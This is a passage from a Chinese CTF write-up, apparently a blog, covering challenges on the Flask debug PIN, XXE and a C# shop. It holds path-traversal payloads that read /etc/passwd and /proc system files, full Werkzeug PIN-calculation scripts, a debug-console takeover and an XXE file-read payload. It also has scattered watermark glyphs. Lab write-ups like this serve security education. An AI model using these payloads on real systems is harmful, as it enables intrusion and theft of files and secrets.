+<h2 id="2-预期解-pin-pin-revenge通用"><a href="#2-预期解-pin-pin-revenge通用" class="headerlink" title="2. 预期解 (pin&amp;pin_revenge通用)"></a>2. 预期解 (pin&amp;pin_revenge通用)</h2><p>PIN码是Flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式。</p>
+<p>这两题旨在考查通过任意文件读取漏洞计算 <span class="hexo-wm">ѕ﻿​³𝒗ｅｎ∙‌si﻿﻿𝘵℮​​</span>python flask debug 模式下的 pin 码，并利用debug shell读取flag</p>
+<p>计算逻辑位于 <code>python3.x/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name</code>，</p>
+<p>版本不同的区别在于3.6与3.<span class="hexo-wm">ꜱ‌​𝟯𝐯𝘦𝘯.‌ѕⅈ﻿‍𝐭ｅ‌﻿</span>8的md5加密和sha1加密不同。</p>
+<h3 id="2-1-PIN生成要素"><a href="#2-1-PIN生成要素" class="headerlink" title="2.1 PIN生成要素"></a>2.1 PIN生成要素</h3><h4 id="2-1-1-username"><a href="#2-1-1-username" class="headerlink" title="2.1.1 username"></a>2.1.1 username</h4><p>用户名。通过 getpass.<span class="hexo-wm">ѕ​⑶vｅ𝘯․‌𝐬i﻿​𝐭𝘦﻿​</span>getuser() 读取，通过文件 <code>/etc/passwd</code> 读取。</p>
+<h4 id="2-1-2-modname"><a href="#2-1-2-modname" class="headerlink" title="2.1.2 modname"></a>2.1.2 modname</h4><p>模块名。通过 getattr(mod,<span class="hexo-wm">𝐬﻿⑶𝐯ℯｎ·﻿‍ꜱi‍﻿ｔ𝐞﻿﻿</span>”file”,None) 读取，默认值为 <code>flask.app</code> 。</p>
+<h4 id="2-1-3-appname"><a href="#2-1-3-appname" class="headerlink" title="2.1.3 appname"></a>2.1.3 appname</h4><p>应用名。通过 getattr(app,”name”,<span class="hexo-wm">ꜱ‍𝟯𝐯𝐞ｎ∙﻿ѕ𝐢‍​𝐭𝘦‍‌</span>type(app).name) 读取，默认值为 <code>Flask</code> 。</p>
+<h4 id="2-1-4-moddir"><a href="#2-1-4-moddir" class="headerlink" title="2.1.4 moddir"></a>2.1.4 moddir</h4><p>Flask库下 app.py 的绝对路径。<span class="hexo-wm">ѕ﻿3𝒗ｅ𝘯.‌‍ꜱⅈ﻿‌tｅ﻿</span>通过 getattr(mod,”file”,None) 读取，实际应用中通过报错读取。</p>
+<h4 id="2-1-5-uuidnode"><a href="#2-1-5-uuidnode" class="headerlink" title="2.1.5 uuidnode"></a>2.1.5 uuidnode</h4><p>当前网络的mac地址的十进制数。通过 uuid.getnode() 读取，通过文件 <code>/sys/class/net/eth0/address</code> 得到16进制结果，<span class="hexo-wm">ѕ﻿𝟯ⅴ𝐞ｎ∙﻿𝒔ⅈ‌t𝐞‌​</span>转化为10进制进行计算。</p>
+<h4 id="2-1-6-machine-id"><a href="#2-1-6-machine-id" class="headerlink" title="2.1.6 machine_id"></a>2.1.6 machine_id</h4><p>docker机器id。<span class="hexo-wm">𝘀﻿3𝒗ℯ𝐧．‌𝘴𝐢‍ｔe​﻿</span>每一个机器都会有自已唯一的id，</p>
+<p>linux的i<span class="hexo-wm">𝘀​𝟯𝒗ｅ𝒏.﻿‍𝒔ⅈ‌​tｅ‌​</span>d一般存放在 <code>/etc/machine-id</code> 或 <code>/proc/sys/kernel/random/boot_id</code>，</p>
+<p>docker靶机则读取 <code>/proc/self/cgroup</code> 或 <code>/proc/self/mountinfo</code>，其中第一行的 /docker/ 字符串后面的内容作为机器的id，在docker环境下读取后两个，非docker环境三个都需要读取。</p>
+<p>首先访问/etc/machine-id，有值就break，没值就访问/proc/sys/kernel/random/boot_id，<span class="hexo-wm">s‌﻿𝟯𝘷e𝘯․‍𝘀𝐢﻿‍𝘵℮‌﻿</span>然后不管此时有没有值，再访问/proc/self/cgroup其中的值拼接到前面的值后面。</p>
+<p>Python Flask Debug Pin 的计算代码如下：</p>
+<h3 id="2-2-Python-3-8-MD5-Pin计算代码"><a href="#2-2-Python-3-8-MD5-Pin计算代码" class="headerlink" title="2.2 Python < 3.8 MD5 Pin计算代码"></a>2.2 Python &lt; 3.8 MD5 Pin计算代码</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+     <span class="token string">'flaskweb'</span><span class="token punctuation">,</span> <span class="token comment">#username</span>
+     <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment">#modname</span>
+     <span class="token string">'Flask'</span><span class="token punctuation">,</span> <span class="token comment">#appname</span>
+     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment">#moddir</span>
+<span class="token punctuation">]</span>
+
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span> <span class="token comment">#uuidnode</span>
+     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span> <span class="token comment">#machine_id</span>
+<span class="token punctuation">]</span>
+
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
+
+cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
+
+num <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
+   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+rv <span class="token operator">=</span><span class="token boolean">None</span>
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+          <span class="token keyword">break</span>
+       <span class="token keyword">else</span><span class="token punctuation">:</span>
+          rv <span class="token operator">=</span> num
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre>
+
+<h3 id="2-3-Python-3-8-sha1-Pin计算代码"><a href="#2-3-Python-3-8-sha1-Pin计算代码" class="headerlink" title="2.3 Python >= 3.8 sha1 Pin计算代码"></a>2.3 Python &gt;= 3.8 sha1 Pin计算代码</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token comment">#username</span>
+    <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment">#modname</span>
+    <span class="token string">'Flask'</span><span class="token punctuation">,</span> <span class="token comment">#appname</span>
+    <span class="token string">'/usr/local/lib/python3.11/site-packages/flask/app.py'</span> <span class="token comment">#moddir</span>
+<span class="token punctuation">]</span>
+
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'2485376910315'</span><span class="token punctuation">,</span> <span class="token comment">#uuidnode</span>
+    <span class="token string">'3c253d1e-8856-4e45-98b5-e82146c245c5'</span> <span class="token comment">#machine_id</span>
+<span class="token punctuation">]</span>
+
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
+
+cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
+
+num <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
+    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+rv <span class="token operator">=</span><span class="token boolean">None</span>
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        rv <span class="token operator">=</span> num
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre>
+<h3 id="2-4-利用任意文件读取获取信息"><a href="#2-4-利用任意文件读取获取信息" class="headerlink" title="2.4 利用任意文件读取获取信息"></a>2.4 利用任意文件读取获取信息</h3><h4 id="2-4-1-读取-username"><a href="#2-4-1-读取-username" class="headerlink" title="2.4.1 读取 username"></a>2.4.1 读取 username</h4><p><code>payload</code> 如下：</p>
+<pre class="language-none"><code class="language-none">/?location=../../../../../../etc/passwd</code></pre>
+
+<p>返回如下信息</p>
+<pre class="language-none"><code class="language-none">root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin</code></pre>
+<p>判断 username <span class="hexo-wm">ꜱ​​⑶𝐯𝘦𝒏•​​sｉ​‌𝐭e‍</span>= “root”</p>
+<h4 id="2-4-2-读取-moddir"><a href="#2-4-2-读取-moddir" class="headerlink" title="2.4.2 读取 moddir"></a>2.4.2 读取 moddir</h4><p>随机输入不存在的路径或者将 <code>?location=</code> 参数置空即可<span class="hexo-wm">𝘴‌3𝘷𝘦n.‍‌s𝐢‌​𝐭𝐞‍</span>获得报错界面如下</p>
+<p><img src="image-21.png" alt="image-21.png"></p>
+<p>从中即可获取 moddir = “/usr/local/lib/python3.<span class="hexo-wm">𝐬‍3𝒗ℯ𝘯．‍𝘴ⅈ​𝐭e‌‍</span>11/site-packages/flask/app.py”</p>
+<h4 id="2-4-3-读取-uuidnode"><a href="#2-4-3-读取-uuidnode" class="headerlink" title="2.4.3 读取 uuidnode"></a>2.4.3 读取 uuidnode</h4><p><code>payload</code> 如下：</p>
+<pre class="language-none"><code class="language-none">/?location=../../../../../../sys/class/net/eth0/address</code></pre>
+
+<p>返回如下信息</p>
+<pre class="language-none"><code class="language-none">02:42:ac:02:04:80</code></pre>
+<p>经过 <a href="https://www.toolhelper.cn/Digit/BaseConvert">在线进制转换工具</a> 将16进制转1<span class="hexo-wm">s‌﻿⑶v𝘦𝒏∙‌ꜱｉ﻿t℮‍</span>0进制转化后可得<br><img src="image-22.png" alt="image-22.png"></p>
+<p>得到 uuidnode = <span class="hexo-wm">𝐬‌‍3𝒗ℯn·‍𝒔𝐢​ｔｅ‍</span>“2485376910464”</p>
+<h4 id="2-4-4-读取-machine-id"><a href="#2-4-4-读取-machine-id" class="headerlink" title="2.4.4 读取 machine_id"></a>2.4.4 读取 machine_id</h4><p>尝试读取</p>
+<pre class="language-none"><code class="language-none">/?location=../../../../../../etc/machine-id</code></pre>
+<p>发现页面抛出 <code>FileNotFoundError</code> 错误</p>
+<p>判断靶机为docker <del>（其实本来就知道）</del></p>
+<p>因此尝试读取</p>
+<pre class="language-none"><code class="language-none">/?location=../../../../../../proc/sys/kernel/random/boot_id</code></pre>
+<p>返回如下信息</p>
+<pre class="language-none"><code class="language-none">3c253d1e-8856-4e45-98b5-e82146c245c5</code></pre>
+<p>尝试读取</p>
+<pre class="language-none"><code class="language-none">/?location=../../../../../../proc/self/cgroup</code></pre>
+<p>返回如下信息</p>
+<pre class="language-none"><code class="language-none">0::/</code></pre>
+<p>即为空，无信息</p>
+<p>因此得出 machine_id = “3c253d1e-8856-<span class="hexo-wm">s​⑶ⅴe𝒏·​​𝘴𝘪‌𝘵℮﻿</span>4e45-98b5-e82146c245c5”</p>
+<p>最后将得到的信息填入Pin计算代码中即可获得当前环境的Pin码如下：</p>
+<pre class="language-none"><code class="language-none">564-346-887</code></pre>
+
+<blockquote>
+<p>请注意：由于Docker每次启动后uuidnode值会改变，Write <span class="hexo-wm">𝘴‍‍𝟯ⅴe𝘯•<span class="hexo-wm">𝘀‍𝟯v𝘦𝘯.‍ѕⅈ﻿ｔｅ﻿</span>﻿si​ｔ℮​﻿</span>Up中的Pin值对该题并不具有普适性，请根据实际环境自行读取uuidnode值并计算相应环境的Pin码使用</p>
+</blockquote>
+<h3 id="2-5-获取-debug-shell"><a href="#2-5-获取-debug-shell" class="headerlink" title="2.5 获取 debug shell"></a>2.5 获取 debug shell</h3><p>随机输入不存在的路径或者将 <code>?location=</code> 参数置空即可获得<span class="hexo-wm">𝒔‌𝟯ⅴ𝘦𝒏․﻿​𝐬𝐢‌𝘵𝐞‌‍</span>报错界面如下</p>
+<p><img src="image-23.png" alt="image-23.png"></p>
+<p>点击右侧控制台图标并输入Pin码即可获得 <code>debug shell</code></p>
+<p>在控制台输入 <code>os.getenv('FLAG')</code> 即可获得flag</p>
+<p><img src="image-24.png" alt="image-24.png"></p>
+<p>获得 <code>pin_revenge</code> 题的 <code>flag</code> 如下:</p>
+<pre class="language-none"><code class="language-none">Spirit{badd44f8-94eb-4648-b5d3-cdf837431e52}</code></pre>
+
+<h1 id="ez-xxe"><a href="#ez-xxe" class="headerlink" title="ez_xxe"></a>ez_xxe</h1><p>题目描述：</p>
+<blockquote>
+<p>so easy………</p>
+</blockquote>
+<p>打开页面后是一个可以输<span class="hexo-wm">𝘴‍𝟯𝒗𝐞ｎ．​𝘀ⅈ﻿𝐭𝘦‌‍</span>入XML文档的界面</p>
+<p><img src="image-25.png" alt="image-25.png"></p>
+<p>并且输入后有回显</p>
+<p>结合题目标题判断是利用xxe漏洞恶<span class="hexo-wm">s﻿‍³ⅴ𝐞𝐧․​𝒔ｉ​​t℮﻿</span>意引入外部实体，直接读靶机文件</p>
+<p><code>payload</code> 如下</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"> 
+&lt;!ENTITY flag SYSTEM "file:///flag" &gt;
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spirit</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>flag</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>flag</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spirit</span><span class="token punctuation">&gt;</span></span></code></pre>
+<p>提交并返回如下<span class="hexo-wm">s​3𝒗ｅ𝒏·​ꜱ𝘪﻿‌𝐭𝘦‍‍</span>界面，获得 <code>flag</code> ：<br><img src="image-26.png" alt="image-26.png"></p>
+<blockquote>
+<p>Spirit{19246b7d-dc61-<span class="hexo-wm">𝘀﻿​³ⅴ𝘦𝘯．‍<span class="hexo-wm">𝒔‌‌𝟯𝐯eｎ·﻿‍𝘀𝐢‍𝒕e​</span>﻿𝐬𝐢‍ｔ𝘦﻿</span>4829-a4f7-54ffd5d76b01}</p>
+</blockquote>
+<h1 id="sharpshop"><a href="#sharpshop" class="headerlink" title="sharpshop"></a>sharpshop</h1><p>题目描述：</p>
+<blockquote>
+<p><img src="image-27.png" alt="image-27.png"></p>
+</blockquote>
+<blockquote>
+<p>Hint: 🤖</p>
+</blockquote>
+<p>打开页面后发现是<del>拼夕夕</del>砍价买flag</p>
+<p><img src="image-28.png" alt="image-28.png"></p>
+<p>经过一个简单的尝试，发现 <code>flag</code> 的价格永远砍不到钱<span class="hexo-wm">ꜱ‌𝟯𝒗ｅ𝘯∙‍​𝘀ⅈ​𝒕e‌</span>包价格及以下 <del>(典)</del></p>
+<p><img src="image-29.png" alt="image-29.png"></p>
+<p>砍到这里就砍不动了 <del>(需要10个金币再砍1刀，<span class="hexo-wm">ѕ﻿‍𝟯𝒗𝐞𝒏․‌𝘀𝐢​﻿ｔ𝘦﻿</span>10个积分换1个金币 无限循环···)</del></p>
+<h2 id="1-反编译ELF-app"><a href="#1-反编译ELF-app" class="headerlink" title="1. 反编译ELF-app"></a>1. 反编译ELF-app</h2><p>Hint 提示我们 <code>robots</code> ,因此访问网站的 <code>robots.txt</code> 如下：</p>
+<p><img src="image-30.png" alt="image-30.png"></p>
+<p>根据提示下载 <code>/sharpshop.tar</code></p>
+<p>发现一个 <code>ELF</code> 类型的 <code>app</code></p>
+<p>初步判断是一个使用 <code>c#</code> 编写的服务端程序</p>
+<p>（此处也可根据题目名称 <code>sharpshop</code> 进行合理猜测）</p>
+<p>Web 突然变 <span class="hexo-wm">ѕ‍​𝟯v𝐞𝘯．​ꜱ𝐢‌te‍</span>Reverse (误)</p>
+<p>使用 <code>ILSpy</code> 进行反编译，提取 <code>c#</code> 文件内容</p>
+<p><img src="image-31.png" alt="image-31.png"></p>
+<p>核心代码如下：</p>
+<pre class="language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">// sharpshop, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</span>
+<span class="token comment">// Shopping</span>
+<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Threading</span><span class="token punctuation">;</span>
+
+<span class="token keyword">internal</span> <span class="token keyword">class</span> <span class="token class-name">Shopping</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">long</span></span> _FlagPrice<span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">long</span></span> _Wallet<span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">int</span></span> _IsCutting<span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token class-name"><span class="token keyword">int</span></span> _IsBuying<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">long</span></span> FlagPrice <span class="token operator">=&gt;</span> _FlagPrice<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">long</span></span> Wallet <span class="token operator">=&gt;</span> _Wallet<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> HasFlag <span class="token punctuation">{</span> <span class="token keyword">get</span><span class="token punctuation">;</span> <span class="token keyword">private</span> <span class="token keyword">set</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsCutting<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+        <span class="token punctuation">}</span>
+        _FlagPrice <span class="token operator">-=</span> <span class="token punctuation">(</span>_FlagPrice <span class="token operator">-</span> _Wallet<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
+        Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsCutting<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">Buy</span><span class="token punctuation">(</span><span class="token keyword">out</span> <span class="token class-name"><span class="token keyword">string</span></span> message<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsBuying<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+        <span class="token punctuation">}</span>
+        <span class="token class-name"><span class="token keyword">long</span></span> flagPrice <span class="token operator">=</span> _FlagPrice<span class="token punctuation">;</span>
+        _Wallet <span class="token operator">-=</span> flagPrice<span class="token punctuation">;</span>
+        message <span class="token operator">=</span> <span class="token interpolation-string"><span class="token string">$"购买后余额：</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token expression language-csharp">_Wallet</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">;</span>
+        <span class="token class-name"><span class="token keyword">bool</span></span> result<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_Wallet <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            _Wallet <span class="token operator">+=</span> flagPrice<span class="token punctuation">;</span>
+            message <span class="token operator">+=</span> <span class="token string">"，余额不足～"</span><span class="token punctuation">;</span>
+            result <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>
+            message <span class="token operator">+=</span> <span class="token string">"，购买成功～"</span><span class="token punctuation">;</span>
+            HasFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            result <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        Interlocked<span class="token punctuation">.</span><span class="token function">Exchange</span><span class="token punctuation">(</span><span class="token keyword">ref</span> _IsBuying<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token function">Shopping</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        _IsCutting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        _IsBuying <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        _Wallet <span class="token operator">=</span> <span class="token number">100L</span><span class="token punctuation">;</span>
+        _FlagPrice <span class="token operator">=</span> <span class="token keyword">long</span><span class="token punctuation">.</span>MaxValue<span class="token punctuation">;</span>
+        HasFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<h2 id="2-竞态条件利用"><a href="#2-竞态条件利用" class="headerlink" title="2. 竞态条件利用"></a>2. 竞态条件利用</h2><p>仔细观察后就会<span class="hexo-wm">s‍𝟯𝒗ｅ𝐧．​‍ѕ𝘪‍𝒕e﻿​</span>发现该代码的反常之处</p>
+<p>在计算余额是否足够购买 <code>flag</code> 时</p>
+<p>代码没有直接判断 <code>_Wallet - flagPrice</code> 的正负</p>
+<p>而是先将 <code>_Wallet -= flagPrice</code></p>
